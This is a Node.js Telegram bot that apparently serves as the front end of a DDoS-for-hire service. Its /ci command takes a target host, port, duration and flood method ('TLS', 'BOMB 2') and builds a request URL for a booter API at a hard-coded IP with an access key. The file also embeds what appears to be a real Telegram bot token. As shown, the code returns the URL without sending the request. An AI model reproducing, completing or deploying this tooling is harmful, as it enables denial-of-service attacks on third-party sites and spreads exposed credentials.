const TelegramBot = require('node-telegram-bot-api');

// Your Telegram bot token
const token = '6821044998:AAEgb7xNvTGIOWLPJjU5XjG2U8riJ9GqVW8';

// List of methods
const methodList = ['TLS', 'BOMB 2'];

// Initialize the bot
const bot = new TelegramBot(token, { polling: true });

// Track the last time the command was executed
let lastCommandTime = new Date();

// Cooldown time in seconds
const cooldownSeconds = 10;

// Listen for the /start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Hello! I am your bot. Use /ca to see usage instructions and a list of methods or /ci host port time method to execute a specific command.');
});

// Listen for the /ca command
bot.onText(/\/ca/, (msg) => {
  const chatId = msg.chat.id;

  // Display a list of methods, usage instructions, and examples in a single message
  const methodMessage = methodList.map((method) => `- ${method}`).join('\n');
  const fullMessage = 'List of Methods:\n' + methodMessage + '\n\nUsage: /ci host port time method\nExample: /ci https://example.com 433 60 TLS\nMake sure there are no extra spaces and the order is correct when typing.';
  bot.sendMessage(chatId, fullMessage);
});

// Listen for the /ci command
bot.onText(/\/ci$/, (msg) => {
  const chatId = msg.chat.id;

  // Display usage information for /ci only
  const usageMessage = 'Use /ci host port time method to execute a specific command. Example: /ci https://example.com 433 60 TLS';
  bot.sendMessage(chatId, usageMessage);
});

// Listen for the /ci host port time method command
bot.onText(/\/ci (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  // Check cooldown time
  const now = new Date();
  const cooldownExpired = (now - lastCommandTime) / 1000 > cooldownSeconds;

  if (cooldownExpired) {
    const command = match[1].split(' ');

    if (command.length === 4) {
      const [host, port, time, method] = command;

      // Create API URL based on parameters
      const apiUrl = 'http://167.99.69.83:1337/api?key=staffakira&host=' + host + '&port=' + port + '&time=' + time + '&method=' + method;

      // Send a success message to the Telegram user in the required format
      const successMessage = 'Success!\nHost: {' + host + '}\nPort: {' + port + '}\nTime: {' + time + '}\nMethod: {' + method + '}\nAPI URL: ' + apiUrl;
      bot.sendMessage(chatId, successMessage);

      // Update the last command execution time
      lastCommandTime = now;
    } else {
      // Handle incorrect command format
      const errorMessage = 'Command format is incorrect. Make sure it looks like this:\n/ci host port time method\nExample: /ci https://example.com 433 60 TLS\nEnsure there are no extra spaces and the order is correct.';
      bot.sendMessage(chatId, errorMessage);
    }
  } else {
    // Handle cooldown
    const remainingCooldown = cooldownSeconds - (now - lastCommandTime) / 1000;
    bot.sendMessage(chatId, `Please wait ${remainingCooldown.toFixed(0)} seconds before using this command again.`);
  }
});

